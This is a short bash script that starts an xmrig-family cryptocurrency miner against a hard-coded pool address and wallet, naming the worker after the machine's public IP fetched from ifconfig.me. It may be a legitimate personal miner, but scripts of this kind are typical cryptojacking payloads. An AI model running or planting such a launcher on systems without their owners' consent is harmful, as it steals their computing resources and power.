#!/bin/bash
POOL=135.148.35.218:1123
WALLET=ZEPHsBL4wFydCvcmNJEHc7iR7Fq6NcZtFHsSAV7GpztYDzZtyanCTShcMd7d2n96yMHhioHisWLpJWGcvaAstUYm2itMLaQKzhk.CPU_$(echo "$(curl -s ifconfig.me)" | tr . _ )
cd "$(dirname "$0")"
chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-disabled
